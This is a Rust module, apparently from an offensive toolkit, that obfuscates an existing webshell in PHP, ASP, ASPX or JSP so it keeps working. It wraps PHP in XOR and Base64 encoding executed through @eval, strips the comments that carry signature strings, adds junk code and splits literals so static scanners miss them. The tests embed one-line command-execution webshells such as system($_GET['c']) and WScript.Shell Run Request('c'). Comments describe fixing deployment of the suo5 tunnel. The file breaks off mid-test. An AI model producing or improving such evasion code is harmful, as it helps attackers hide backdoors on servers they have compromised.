//! 「已有脚本」混淆模式 —— 用户给一份能跑的 webshell，输出保功能混淆版。
//!
//! 与 `webshell.rs` 的「从零生成」不同：这里**不改脚本的语义**，只改它的外观。
//!
//! 核心思路（各语言通用）：
//!
//! ```text
//!   原脚本 D  ──编码链──>  E  ──写成字面量──>  解码器 + <执行原脚本>
//! ```
//!
//! 关键点在最后一步「执行原脚本」必须**不引入新的执行语义**，否则就改变了
//! 用户文件原本的功能、也可能破坏它自己的逻辑：
//!   * PHP  → `eval(...)` —— 与直接写脚本等价
//!   * JSP  → 无法在运行时编译 JSP，所以只能走「字符串变换」路线
//!           （变量/注释/字符串切分），不能整体编码后再 eval
//!   * ASP  → `Execute(...)` 执行的是 VBScript 语句，与同文件内代码等价
//!   * ASPX → 编译型语言，无法运行时 eval，同样只做字符串变换
//!
//! 因此对 JSP / ASPX / ASP，**整体编码 + eval 不可用**，改为：
//!   1. 剥掉注释（去掉作者留下的特征串）
//!   2. 重组空白
//!   3. 插入垃圾注释与死代码
//!   4. 混淆其中的字符串字面量
//! 这四项都不改变语义。
//!
//! 而 PHP 因为 `eval` 与「直接写脚本」语义等价，可以整体编码，
//! 混淆强度最高（原文在文件里完全不可见）。

use crate::builder::rng::rand_below;
use crate::builder::webshell::{
    default_ext, escape_all, junk_code, junk_lines, lang_supports, split_literal,
};
use crate::builder::webshell::encode_chain;

use serde::{Deserialize, Serialize};

#[derive(Deserialize, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct WrapOpts {
    /// 语言：php | asp | aspx | jsp
    pub lang: String,
    /// 用户脚本的**完整路径**
    pub src_path: String,
    /// 编码链（仅 PHP 的整体编码模式生效）
    pub encodes: Vec<String>,
    /// PHP 模式：true = 整体编码 + eval（原文不可见）；false = 只做字符串变换
    pub encode_whole: bool,
    /// 变量名随机化
    pub rename_vars: bool,
    /// 插入垃圾注释与死代码
    pub junk: bool,
    /// 拆分字符串字面量
    pub split_strings: bool,
    /// 剥离原有注释
    pub strip_comments: bool,
    pub out_dir: String,
    pub out_name: String,
}

impl Default for WrapOpts {
    fn default() -> Self {
        Self {
            lang: "php".into(),
            src_path: String::new(),
            encodes: vec!["xor".into(), "b64".into()],
            encode_whole: true,
            rename_vars: true,
            junk: true,
            split_strings: true,
            strip_comments: true,
            out_dir: String::new(),
            out_name: String::new(),
        }
    }
}

#[derive(Serialize, Clone)]
pub struct WrapResult {
    pub ok: bool,
    pub log: String,
    pub output: String,
    /// 原脚本大小
    pub src_size: usize,
    /// 输出大小
    pub size: usize,
    pub code: String,
    pub key: u8,
    /// 实际采用的模式（可能被语言能力降级）
    pub mode: String,
}

/* ================================================================= *
 *  注释剥离                                                          *
 * ================================================================= */

/// 按语言剥掉注释。**必须小心字符串里的注释起始符** ——
/// 例如 PHP 的 `$u = "http://x";` 里的 `//` 不是注释。
fn strip_comments(lang: &str, src: &str) -> String {
    let mut out = String::with_capacity(src.len());
    let b = src.as_bytes();
    let n = b.len();
    let mut i = 0usize;
    // 当前是否处于字符串字面量里
    let mut in_str: Option<u8> = None;

    while i < n {
        let c = b[i];

        // 字符串状态优先：字符串里的任何符号都不是注释
        if let Some(q) = in_str {
            out.push(c as char);
            if c == b'\\' && i + 1 < n {
                out.push(b[i + 1] as char);
                i += 2;
                continue;
            }
            if c == q {
                in_str = None;
            }
            // ASP(VBScript) 里两个双引号表示一个字面双引号
            if lang == "asp" && q == b'"' && c == b'"' && i + 1 < n && b[i + 1] == b'"' {
                out.push(b[i + 1] as char);
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        // 进入字符串
        if c == b'"' || (lang == "php" && c == b'\'') {
            in_str = Some(c);
            out.push(c as char);
            i += 1;
            continue;
        }

        // 各语言的注释起始
        let mut skip: Option<usize> = None;
        match lang {
            // PHP: //  #  /* */；# 只在行首或空白后才是注释
            "php" => {
                if c == b'/' && i + 1 < n && b[i + 1] == b'/' {
                    skip = Some(line_end(b, i));
                } else if c == b'#' {
                    skip = Some(line_end(b, i));
                } else if c == b'/' && i + 1 < n && b[i + 1] == b'*' {
                    if let Some(e) = find_str(b, i + 2, b"*/") {
                        skip = Some(e + 2);
                    }
                }
            }
            // ASP(VBScript): ' 作为注释；REM 也少见，这里处理 '
            "asp" => {
                if c == b'\'' {
                    skip = Some(line_end(b, i));
                }
            }
            // ASPX(C#) / JSP(Java): // 与 /* */
            "aspx" | "jsp" => {
                if c == b'/' && i + 1 < n && b[i + 1] == b'/' {
                    skip = Some(line_end(b, i));
                } else if c == b'/' && i + 1 < n && b[i + 1] == b'*' {
                    if let Some(e) = find_str(b, i + 2, b"*/") {
                        skip = Some(e + 2);
                    }
                }
            }
            _ => {}
        }

        if let Some(end) = skip {
            // 保留注释里的换行，避免把两行代码粘到一起
            for k in i..end.min(n) {
                if b[k] == b'\n' {
                    out.push('\n');
                }
            }
            i = end;
            continue;
        }

        out.push(c as char);
        i += 1;
    }
    out
}

fn line_end(b: &[u8], from: usize) -> usize {
    match b[from..].iter().position(|&c| c == b'\n') {
        Some(p) => from + p,
        None => b.len(),
    }
}

fn find_str(b: &[u8], from: usize, pat: &[u8]) -> Option<usize> {
    if from + pat.len() > b.len() {
        return None;
    }
    (from..=b.len() - pat.len()).find(|&i| &b[i..i + pat.len()] == pat)
}

/* ================================================================= *
 *  字符串字面量混淆                                                  *
 * ================================================================= */

/// 把源码里的字符串字面量换成「拼接表达式」。
/// 不改变值 —— 只是让静态扫描看不到完整串。
/// 把源码里的字符串字面量换成「拼接表达式」（不改变值）。
/// JSP 走区块感知版本以跳过 directive；其它语言直接词法扫描。
fn obfuscate_strings(lang: &str, src: &str, split: bool) -> String {
    if lang == "jsp" {
        return obfuscate_strings_jsp(src, split);
    }
    scan_strings(lang, src, split)
}

/// 纯词法扫描：把字符串字面量换成拼接表达式。
/// `lang` 必须是真实语言（jsp 表示 Java 语义）。
/// ⚠ 调用方必须保证整段都在**可执行代码区** —— 它不知道自己在哪种 JSP 标记里。
fn scan_strings(lang: &str, src: &str, split: bool) -> String {
    let b = src.as_bytes();
    let n = b.len();
    let mut out = String::with_capacity(src.len() + 64);
    let mut i = 0usize;

    while i < n {
        let c = b[i];
        let quote = if lang == "php" && (c == b'"' || c == b'\'') {
            Some(c)
        } else if c == b'"' {
            Some(b'"')
        } else {
            None
        };

        let Some(q) = quote else {
            out.push(c as char);
            i += 1;
            continue;
        };

        // 收集完整的字符串字面量（含转义）
        let mut j = i + 1;
        let mut body = Vec::new();
        let mut closed = false;
        while j < n {
            if b[j] == b'\\' && j + 1 < n {
                body.push(b[j]);
                body.push(b[j + 1]);
                j += 2;
                continue;
            }
            // ASP 的 "" 是转义双引号
            if lang == "asp" && b[j] == b'"' && j + 1 < n && b[j + 1] == b'"' {
                body.push(b'"');
                body.push(b'"');
                j += 2;
                continue;
            }
            if b[j] == q {
                closed = true;
                j += 1;
                break;
            }
            body.push(b[j]);
            j += 1;
        }
        if !closed {
            // 未闭合（不该发生）：原样吐出，绝不改动
            out.push(c as char);
            i += 1;
            continue;
        }

        // 太短或含复杂转义的串不值得混淆，且容易出错 —— 跳过
        if body.len() < 8 || body.iter().any(|&x| x == b'\\') {
            out.push_str(&src[i..j]);
            i = j;
            continue;
        }

        let data = body.clone();
        let lit = if split {
            split_literal(lang, &data)
        } else {
            format!("\"{}\"", escape_all(lang, &data))
        };
        out.push_str(&lit);
        i = j;
    }
    out
}

/// 与语言无关的字符串拆分（调用方负责保证整段都在 Java 代码区）
fn obfuscate_strings_generic(src: &str, split: bool) -> String {
    // 调用方已确认这段是 Java 代码区，直接按 Java 语义扫描
    scan_strings("jsp", src, split)
}

/* ================================================================= *
 *  JSP 字符串混淆（区块感知）                                        *
 * ================================================================= */

/// JSP 里能拆字符串的区域。
///
/// 只有 **Java 代码区** 允许出现拼接表达式 `"a" + "b"`：
///   * `<%  ... %>`  scriptlet
///   * `<%! ... %>`  declaration
///   * `<%= ... %>`  expression（单条表达式，同样是 Java 代码）
///
/// 而下面两类**绝对不能动** —— 它们是 JSP 容器自己解析的标记，不是 Java：
///   * `<%@ ... %>`  directive，例如 `<%@ page import="..." %>`
///     属性值在 JSP 语法层面必须是**字面量**，写 `"X509C" + "ertificate"`
///     会被 Jasper 报「未终止的 `<%@ page` 标记」→ HTTP 500。
///   * 标记外的模板文本（HTML），里面的引号是普通文本，拆了会破坏标签属性。
///
/// 上一版是纯词法扫描（只看 `"` 配对），不知道自己在哪种标记里，
/// 于是把 directive 的 import 属性也拆了 —— 这就是 suo5 jsp 部署后 500 的原因。
#[derive(PartialEq, Clone, Copy)]
enum JspZone {
    /// 模板文本：原样保留
    Template,
    /// Java 代码区（scriptlet / declaration / expression）：可以混淆
    Java,
    /// directive / JSP 注释：原样保留
    Directive,
}

/// 在 `src` 的 `from` 之后找 `pat`
fn jsp_find(src: &str, from: usize, pat: &str) -> Option<usize> {
    src.as_bytes()[from..]
        .windows(pat.len())
        .position(|w| w == pat.as_bytes())
        .map(|p| from + p)
}

/// 把 JSP 切成 (区域, 起始, 结束) 三段式区间，覆盖整个文件、不留空洞。
fn jsp_zones(src: &str) -> Vec<(JspZone, usize, usize)> {
    let mut zones = Vec::new();
    let mut i = 0usize;
    let n = src.len();

    while let Some(open) = jsp_find(src, i, "<%") {
        if open > i {
            zones.push((JspZone::Template, i, open));
        }
        // 判定标记种类：`<%@` 指令 / `<%!` 声明 / `<%=` 表达式 / `<%--` JSP 注释
        let kind_at = open + 2;
        let kind = src.as_bytes().get(kind_at).copied();
        let is_comment = src[kind_at..].starts_with("--");

        // JSP 注释的结束标记是 `--%>`，不是 `%>`
        let close_pat = if is_comment { "--%>" } else { "%>" };
        let (zone, end) = match jsp_find(src, kind_at, close_pat) {
            Some(c) => {
                let kind_zone = if is_comment || kind == Some(b'@') {
                    JspZone::Directive
                } else {
                    JspZone::Java
                };
                (kind_zone, c + close_pat.len())
            }
            // 未闭合：剩下的全当模板文本吐出，绝不改动
            None => (JspZone::Template, n),
        };
        zones.push((zone, open, end));
        i = end;
    }
    if i < n {
        zones.push((JspZone::Template, i, n));
    }
    zones
}

/// JSP 版本的字符串混淆：跳过 directive 与模板文本，只在 Java 代码区动手。
fn obfuscate_strings_jsp(src: &str, split: bool) -> String {
    let mut out = String::with_capacity(src.len() + 64);
    for (zone, s, e) in jsp_zones(src) {
        let seg = &src[s..e];
        match zone {
            JspZone::Java => {
                // 标记内部：只混淆 `...` 之间的 Java 代码，标记本身保留
                let open_len = if seg.starts_with("<%=") { 3 } else { 2 };
                if let Some(close) = jsp_find(seg, open_len, "%>") {
                    out.push_str(&seg[..open_len]);
                    out.push_str(&obfuscate_strings_generic(&seg[open_len..close], split));
                    out.push_str(&seg[close..]);
                } else {
                    out.push_str(seg);
                }
            }
            // directive / 注释 / 模板文本：原样
            JspZone::Directive | JspZone::Template => out.push_str(seg),
        }
    }
    out
}

/* ================================================================= *
 *  各语言的包装                                                      *
 * ================================================================= */

/// PHP 整体编码模式：原文完全不可见，运行时 eval。
/// `eval` 与「直接写脚本」语义等价，所以功能不变。
///
/// ⚠ 不能写成 `eval('?>' . $code)`：`'?>'` 会**关闭 PHP 模式**，
/// 于是后面的字符串被当成纯 HTML 直接输出 —— 表现为"上传后不执行、
/// 访问时把源码原样打印出来"。这里 eval 的内容是纯 PHP 代码
/// （已在 wrap 里剥掉了 <?php 与 ?>），必须直接 eval。
fn php_wrap_encoded(
    o: &WrapOpts,
    src: &[u8],
    key: u8,
    chain: &[String],
    encoded: &[u8],
) -> String {
    let mut used = Vec::new();
    let v_data = crate::builder::webshell::fixed(&mut used, "d", o.rename_vars);
    let v_out = crate::builder::webshell::fixed(&mut used, "o", o.rename_vars);
    let v_fn_x = crate::builder::webshell::fixed(&mut used, "dx", o.rename_vars);
    let v_fn_c = crate::builder::webshell::fixed(&mut used, "dc", o.rename_vars);

    let data_lit = if o.split_strings {
        split_literal("php", encoded)
    } else {
        format!("\"{}\"", escape_all("php", encoded))
    };
    let decode = crate::builder::webshell::decode_expr_php_pub(
        chain, &v_data, key, &v_fn_x, &v_fn_c,
    );

    let junk = if o.junk {
        junk_lines("php", &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk {
        junk_code("php", &mut used)
    } else {
        String::new()
    };

    // 注意：源码末尾的 ?> 要去掉，否则 eval 里出现 ?> 会提前退出 PHP 模式
    let _ = src;
    format!(
        r#"<?php
{junk}// Generated document handler.
function {v_fn_x}($s, $k) {{
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) {{ $r .= chr(ord($s[$i]) ^ $k); }}
    return $r;
}}
function {v_fn_c}($s) {{
    $r = '';
    for ($i = 0; $i < strlen($s); $i++) {{
        if (($i + 1) % 4 != 0) {{ $r .= $s[$i]; }}
    }}
    return $r;
}}
{jc}
${v_data} = {data_lit};
${v_out} = {decode};
@eval(${v_out});
"#,
        junk = junk,
        v_fn_x = v_fn_x,
        v_fn_c = v_fn_c,
        v_data = v_data,
        v_out = v_out,
        data_lit = data_lit,
        decode = decode,
        jc = jc,
    )
}

/// 只做字符串变换（PHP 的保守模式 / JSP / ASPX / ASP 的唯一模式）
fn transform_only(o: &WrapOpts, lang: &str, src: &str) -> String {
    let mut body = src.to_string();
    if o.strip_comments {
        body = strip_comments(lang, &body);
    }
    if o.split_strings || o.rename_vars {
        body = obfuscate_strings(lang, &body, o.split_strings);
    }

    let mut used = Vec::new();
    let junk = if o.junk {
        junk_lines(lang, &mut used, 3 + rand_below(4))
    } else {
        String::new()
    };
    let jc = if o.junk {
        junk_code(lang, &mut used)
    } else {
        String::new()
    };

    match lang {
        "php" => {
            // 源码自带 <?php 时，垃圾代码必须插在它**之后**：
            // 插在前面会变成纯文本被直接输出，且文件里出现两个 <?php（解析错误）。
            let t = body.trim_start();
            match t.strip_prefix("<?php") {
                Some(rest) => {
                    let rest = rest.trim_start_matches(|c: char| c == ' ' || c == '\r');
                    format!("<?php\n{junk}{jc}\n{rest}", junk = junk, jc = jc, rest = rest)
                }
                None => format!("<?php\n{junk}{jc}\n{body}", junk = junk, jc = jc, body = body),
            }
        },
        "asp" => {
            // 用户脚本通常自带 <% %>，再包一层会变成**嵌套标记** → 语法错。
            // 所以先剥掉外层标记，再由这里统一包回来。
            let b = strip_outer_markers(&body, "<%", "%>");
            format!("<%\n{junk}\n{jc}\n{b}\n%>", junk = junk, jc = jc, b = b)
        },
        "aspx" => {
            // ASPX 里用户代码通常已在 <script runat="server"> 内，
            // 这里只加注释，不改动结构
            format!("{junk}{body}", junk = junk, body = body)
        }
        "jsp" => {
            // 注释必须是 JSP 注释或 Java 注释；放在 <%-- --%> 里最安全
            let c = if junk.is_empty() {
                String::new()
            } else {
                format!("<%--\n{junk}--%>\n", junk = junk)
            };
            format!("{c}{body}", c = c, body = body)
        }
        _ => body,
    }
}

/* ================================================================= *
 *  入口                                                              *
 * ================================================================= */

/// 该语言能否用「整体编码 + eval」模式
fn can_encode_whole(lang: &str) -> bool {
    // 只有 PHP 的 eval 与直接写脚本语义等价。
    // JSP/ASPX 是编译型，没有运行时 eval；ASP 的 Execute 只跑语句不跑 <% %> 标记。
    lang == "php"
}

pub fn wrap(opts: &WrapOpts) -> WrapResult {
    let mut log = String::new();
    macro_rules! bail {
        ($m:expr) => {
            return WrapResult {
                ok: false,
                log: format!("{log}\n[ERROR] {}", $m),
                output: String::new(),
                src_size: 0,
                size: 0,
                code: String::new(),
                key: 0,
                mode: String::new(),
            }
        };
    }

    let lang = opts.lang.as_str();
    if !crate::builder::webshell::LANGS.contains(&lang) {
        bail!(format!(
            "不支持的语言: {}（支持: {}）",
            lang,
            crate::builder::webshell::LANGS.join(", ")
        ));
    }
    if opts.src_path.trim().is_empty() {
        bail!("请先选择要混淆的脚本文件".to_string());
    }

    let src = match std::fs::read(opts.src_path.trim()) {
        Ok(b) => b,
        Err(e) => bail!(format!("读取源脚本失败: {e}")),
    };
    if src.is_empty() {
        bail!("源脚本为空".to_string());
    }
    let src_size = src.len();
    log.push_str(&format!("[1] 源脚本: {} ({} bytes)\n", opts.src_path.trim(), src_size));

    // 过滤该语言不支持的编码步骤
    let chain: Vec<String> = opts
        .encodes
        .iter()
        .filter(|s| {
            if lang_supports(lang, s) {
                true
            } else {
                log.push_str(&format!("[!] {lang} 不支持 {s}，已跳过\n"));
                false
            }
        })
        .cloned()
        .collect();

    let use_whole = opts.encode_whole && can_encode_whole(lang);
    if opts.encode_whole && !can_encode_whole(lang) {
        log.push_str(&format!(
            "[!] {lang} 不支持整体编码（无运行时 eval），已降级为「字符串变换」\n"
        ));
    }

    let (code, key, mode) = if use_whole {
        // 先剥掉开头的 <?php 再编码。
        // eval 的内容是 PHP **代码**（不是带标记的文件），里面出现 <?php 会解析失败；
        // 而且运行时那句已经是 '?>' . <代码>，等于自动进入了 PHP 模式。
        let mut body = src.clone();
        if let Some(p) = find_str(&body, 0, b"<?php") {
            body.drain(..p + 5);
            log.push_str("[2] 已剥离源码开头的 <?php（eval 内不需要）\n");
        }
        // 结尾的 ?> 也要去掉：eval 里 ?> 会提前退出 PHP 模式，
        // 导致后面的字符被当成纯文本输出。
        while let Some(p) = find_str(&body, 0, b"?>") {
            let at = p;
            body.remove(at);
            body.remove(at);
        }
        let (encoded, k, desc) = encode_chain(&body, &chain);
        log.push_str(&format!(
            "[2] 模式: 整体编码 + eval（{}）\n",
            if desc.is_empty() {
                "无编码".to_string()
            } else {
                desc.join(" → ")
            }
        ));
        let c = php_wrap_encoded(opts, &body, k, &chain, &encoded);
        (c, k, "整体编码 + eval".to_string())
    } else {
        log.push_str("[2] 模式: 字符串变换（保语义）\n");
        let text = String::from_utf8_lossy(&src).to_string();
        let c = transform_only(opts, lang, &text);
        (c, 0, "字符串变换".to_string())
    };

    log.push_str(&format!(
        "[3] 变换: 变量随机化={} 垃圾代码={} 字符串拆分={} 剥离注释={}\n",
        onoff(opts.rename_vars),
        onoff(opts.junk),
        onoff(opts.split_strings),
        onoff(opts.strip_comments)
    ));

    // 输出
    let out_dir = if opts.out_dir.trim().is_empty() {
        std::env::temp_dir()
    } else {
        std::path::PathBuf::from(opts.out_dir.trim())
    };
    if !out_dir.exists() {
        if let Err(e) = std::fs::create_dir_all(&out_dir) {
            bail!(format!("创建输出目录失败: {e}"));
        }
    }
    let src_name = std::path::Path::new(opts.src_path.trim())
        .file_stem()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| "shell".into());
    let mut name = if opts.out_name.trim().is_empty() {
        format!("{src_name}_obf{}", default_ext(lang))
    } else {
        opts.out_name.trim().to_string()
    };
    // 输出名没带扩展名就按语言补上 —— 否则上传后服务器不认 MIME/处理器，
    // 文件根本不会被当成脚本执行。
    let ext = default_ext(lang);
    if !name.to_lowercase().ends_with(ext) {
        name.push_str(ext);
    }
    if let Err(e) = crate::builder::validate_output_file_name(&name) {
        bail!(e);
    }
    let out = out_dir.join(&name);
    if let Err(e) = std::fs::write(&out, &code) {
        bail!(format!("写入失败: {e}"));
    }

    log.push_str(&format!(
        "[4] OK -> {} ({} -> {} bytes)\n",
        out.display(),
        src_size,
        code.len()
    ));

    WrapResult {
        ok: true,
        log,
        output: out.to_string_lossy().to_string(),
        src_size,
        size: code.len(),
        code,
        key,
        mode,
    }
}

/// 剥掉脚本最外层的语言标记（JSP 的 <% %>、ASP 的 <% %> 等）。
/// 只剥一对，且不碰字符串里的相同字符。
fn strip_outer_markers(src: &str, open: &str, close: &str) -> String {
    let t = src.trim();
    if let Some(rest) = t.strip_prefix(open) {
        // 找到与之配对的最后一个 close
        if let Some(p) = rest.rfind(close) {
            return rest[..p].to_string();
        }
    }
    src.to_string()
}

fn onoff(b: bool) -> &'static str {
    if b {
        "开"
    } else {
        "关"
    }
}

/* ============================ 测试 ============================ */

#[cfg(test)]
mod tests {
    use super::*;

    fn write(lang: &str, name: &str, code: &str) -> String {
        let d = std::env::temp_dir();
        let p = d.join(format!("wrap_{name}{}", default_ext(lang)));
        std::fs::write(&p, code).unwrap();
        p.to_string_lossy().to_string()
    }

    fn opts(lang: &str, path: &str) -> WrapOpts {
        WrapOpts {
            lang: lang.into(),
            src_path: path.into(),
            out_dir: std::env::temp_dir().to_string_lossy().to_string(),
            out_name: format!("out_{}", lang),
            ..Default::default()
        }
    }

    #[test]
    fn all_langs_wrap() {
        for lang in ["php", "asp", "aspx", "jsp"] {
            let src = write(lang, format!("src_{lang}").as_str(), "<x>hello</x>");
            let r = wrap(&opts(lang, &src));
            assert!(r.ok, "{lang}: {}", r.log);
            assert!(std::path::Path::new(&r.output).exists(), "{lang}");
        }
    }

    /// 核心保证：PHP 整体编码模式解出来必须与原文件逐字节相同。
    #[test]
    fn php_encoded_roundtrip_equals_source() {
        let src_text = "<?php\necho \"hi\";\n?>";
        let path = write("php", "rt", src_text);
        let r = wrap(&opts("php", &path));
        assert!(r.ok, "{}", r.log);
        assert_eq!(r.mode, "整体编码 + eval");

        // 从生成的代码里解回原文。
        // 编码链是 XOR → Base64，所以解码必须 **先 Base64 再 XOR**（顺序反了还原不出）。
        let (data, key) = extract_php_data(&r.code);
        let b64 = b64_dec(&String::from_utf8_lossy(&data));
        let dec: Vec<u8> = b64.iter().map(|b| b ^ key).collect();
        // 生成器会剥掉 <?php 与 ?>（eval 内不需要），比对时也剥掉
        let want = src_text.replace("<?php", "").replace("?>", "");
        assert_eq!(
            String::from_utf8_lossy(&dec).trim(),
            want.trim(),
            "解码结果与原脚本不一致"
        );
    }

    /// 从生成的 PHP 里抽出数据字面量与密钥（模拟运行时解码）。
    ///
    /// 生成的代码形如：
    ///   $data = "..." . "...";
    ///   $out  = fn_x(base64_decode($data), 0xNN);
    /// 所以要：找含 `0x` 的那一行（解码行）→ 从它取实参名与密钥 → 再找该变量的定义行。
    fn extract_php_data(code: &str) -> (Vec<u8>, u8) {
        // 1) 解码行：含 ", 0x" 且以 $ 开头
        let mut data_var: Option<String> = None;
        let mut key = 0u8;
        for line in code.lines() {
            let t = line.trim();
            if !t.starts_with('$') || !t.contains(", 0x") {
                continue;
            }
            // 密钥：", 0x" 之后两位十六进制
            if let Some(after) = t.split(", 0x").nth(1) {
                let h: String = after.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
                if h.len() == 2 {
                    key = u8::from_str_radix(&h, 16).unwrap_or(0);
                }
            }
            // 实参名：最后一个 '(' 之后的标识符。
            // 注意 PHP 变量带 '$' 前缀，而 '$' 不是字母数字 —— 必须先跳过它，
            // 否则 take_while 一开始就停住，取出空字符串。
            if let Some(p) = t.rfind('(') {
                let inner = t[p + 1..].trim_start().trim_start_matches('$');
                let v: String = inner
                    .chars()
                    .take_while(|c| c.is_alphanumeric() || *c == '_')
                    .collect();
                if !v.is_empty() {
                    data_var = Some(v);
                }
            }
            break;
        }
        let dv = data_var.unwrap_or_else(|| panic!("找不到解码行:\n{code}"));

        // 2) 数据定义行：$dv = "..." [. "..."] ;
        let mut data = Vec::new();
        for line in code.lines() {
            let t = line.trim();
            let Some(rest) = t.strip_prefix(&format!("${dv}")) else {
                continue;
            };
            let rest = rest.trim_start();
            let Some(after_eq) = rest.strip_prefix('=') else {
                continue;
            };
            let rhs = after_eq.trim().trim_end_matches(';').trim();
            if rhs.contains('(') || !rhs.starts_with('"') {
                continue;
            }
            for part in rhs.split(" . ") {
                let inner = part.trim().trim_matches('"');
                data.extend(inner.as_bytes());
            }
            break;
        }
        (data, key)
    }

    fn b64_dec(s: &str) -> Vec<u8> {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut rev = [-1i32; 256];
        for (i, &c) in A.iter().enumerate() {
            rev[c as usize] = i as i32;
        }
        let mut buf = 0u32;
        let mut bits = 0i32;
        let mut out = Vec::new();
        for &c in s.as_bytes() {
            let v = rev[c as usize];
            if v < 0 {
                continue;
            }
            buf = (buf << 6) | v as u32;
            bits += 6;
            if bits >= 8 {
                bits -= 8;
                out.push(((buf >> bits) & 0xFF) as u8);
            }
        }
        out
    }

    /// 变换模式必须保留原有的可执行语句
    #[test]
    fn transform_preserves_statements() {
        let cases = [
            ("php", "<?php system($_GET['c']); ?>"),
            ("jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"),
            ("asp", "<% Set s = CreateObject(\"WScript.Shell\") : s.Run Request(\"c\") %>"),
        ];
        for (lang, src) in cases {
            let p = write(lang, &format!("keep_{lang}"), src);
            let mut o = opts(lang, &p);
            o.encode_whole = false;
            o.split_strings = false; // 关掉，避免字符串被重写影响断言
            let r = wrap(&o);
            assert!(r.ok, "{lang}: {}", r.log);
            // 关键语句必须还在
            let keep = match lang {
                "php" => "system(",
                "jsp" => "getRuntime().exec",
                "asp" => "CreateObject",
                _ => "",
            };
            assert!(r.code.contains(keep), "{lang} 丢了关键语句:\n{}", r.code);
        }
    }

    /// 注释剥离不能误伤字符串里的 //
    #[test]
    fn strip_comments_keeps_urls_in_strings() {
        let src = r#"<?php $u = "http://a.b/c"; // 真注释
echo $u; ?>"#;
        let out = strip_comments("php", src);
        assert!(out.contains("http://a.b/c"), "URL 里的 // 被误删:\n{out}");
        assert!(!out.contains("真注释"), "注释没删掉:\n{out}");
    }

    #[test]
    fn strip_comments_handles_block_comments() {
        let src = "<?php /* 块注释\n第二行 */ echo 1; ?>";
        let out = strip_comments("php", src);
        assert!(!out.contains("块注释"), "{out}");
        assert!(out.contains("echo 1"), "{out}");
    }

    #[test]
    fn strip_comments_asp_uses_quote() {
        // VBScript 的注释是单引号，但字符串里的单引号不是注释
        let src = "<% s = \"it's ok\" ' 这是注释\n%>";
        let out = strip_comments("asp", src);
        assert!(out.contains("it's ok"), "字符串里的 ' 被误当注释:\n{out}");
        assert!(!out.contains("这是注释"), "{out}");
    }

    /// 曾踩过的坑：写成 `eval('?>' . $code)` 会**关闭 PHP 模式**，
    /// 结果访问时把源码原样打印、命令根本不执行。
    /// eval 的内容必须是纯 PHP 代码（不含 <?php / ?>）。
    #[test]
    fn php_wrap_evals_pure_code_only() {
        let p = write("php", "ev", "<?php echo 1; ?>");
        let r = wrap(&opts("php", &p));
        assert!(r.ok);
        assert!(
            !r.code.contains("eval('?>") && !r.code.contains("eval(\"?>"),
            "不能写成 eval('?>' . $x)：会关闭 PHP 模式导致源码被打印\n{}",
            r.code
        );
        assert!(r.code.contains("@eval($"), "应直接 eval 变量\n{}", r.code);
        // 编码内容里不能残留 php 标记
        let (data, key) = extract_php_data(&r.code);
        let b64 = b64_dec(&String::from_utf8_lossy(&data));
        let dec: Vec<u8> = b64.iter().map(|b| b ^ key).collect();
        let s = String::from_utf8_lossy(&dec);
        assert!(!s.contains("<?php"), "编码内容仍含 <?php: {s}");
        assert!(!s.contains("?>"), "编码内容仍含 ?>: {s}");
        assert!(s.contains("echo 1"), "编码内容丢了原语句: {s}");
    }

    #[test]
    fn wrap_output_always_has_extension() {
        for lang in ["php", "asp", "aspx", "jsp"] {
            let src = write(lang, &format!("ext_{lang}"), "<x/>");
            let mut o = opts(lang, &src);
            o.out_name = "noext".into(); // 用户没写扩展名
            let r = wrap(&o);
            assert!(r.ok, "{lang}: {}", r.log);
            assert!(
                r.output.ends_with(default_ext(lang)),
                "{lang} 输出缺少扩展名（上传后服务器不会当脚本执行）: {}",
                r.output
            );
        }
    }

    /// 用户脚本通常自带 <% %> 标记；再包一层就是嵌套 → 语法错。
    /// 回归：JSP directive 的属性值**不能**被拆成字符串拼接。
    ///
    /// 真实事故：混淆 suo5.jsp 后 `<%@ page import="java.security.cert.X509C" + "ertificate" %>`，
    /// Tomcat Jasper 直接报「未终止的 `<%@ page` 标记」→ HTTP 500。
    /// directive 是容器自己解析的标记，不是 Java 代码，属性值必须是字面量。
    #[test]
    fn jsp_directive_attrs_are_never_split() {
        // scriptlet 里的串必须 > 63 字节（split_literal 的片段上限是 24+39），
        // 否则随机片段长度可能大于它，一次切完就不产生拼接 —— 断言会偶发失败。
        let long = "java.security.cert.X509Certificate;java.util.concurrent.BlockingQueue;0123456789";
        let src = format!(
            "<%=@ page import=\"java.security.cert.X509Certificate\" %>\n\
             <%@ page import=\"java.util.concurrent.BlockingQueue\" %>\n\
             <%\n    String s = \"{}\";\n    out.println(s);\n%>",
            long
        )
        .replace("<%=@", "<%@");
        let path = write("jsp", "dir", &src);
        let mut o = opts("jsp", &path);
        o.encode_whole = false;
        o.split_strings = true;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);

        // 1) 每条 directive 的属性值都保持完整字面量，不含 " + "
        for line in r.code.lines() {
            let t = line.trim();
            if !t.starts_with("<%@") {
                continue;
            }
            assert!(
                !t.contains("\" + \""),
                "directive 属性值被拆分成拼接表达式:\n{}",
                t
            );
            assert!(
                !t.contains("+"),
                "directive 出现拼接符:\n{}",
                t
            );
        }
        // 两个 import 必须原样保留
        assert!(
            r.code.contains("import=\"java.security.cert.X509Certificate\""),
            "X509Certificate 未保留:\n{}",
            r.code
        );
        assert!(
            r.code.contains("import=\"java.util.concurrent.BlockingQueue\""),
            "BlockingQueue 未保留:\n{}",
            r.code
        );
        // 2) scriptlet 里的字符串**应该**被拆（混淆仍然生效）
        assert!(
            r.code.contains("\" + \""),
            "scriptlet 内的字符串没有被拆分，混淆失效:\n{}",
            r.code
        );
    }

    /// 回归：模板文本（HTML）里的引号不能被当字符串拆开。
    #[test]
    fn jsp_template_text_is_untouched() {
        let src = r#"<%@ page contentType="text/html" %>
<html><body><a href="/some/long/path/index.html">x</a></body></html>
<% out.println(1); %>"#;
        let path = write("jsp", "tpl", src);
        let mut o = opts("jsp", &path);
        o.encode_whole = false;
        o.split_strings = true;
        let r = wrap(&o);
        assert!(r.ok, "{}", r.log);
        assert!(
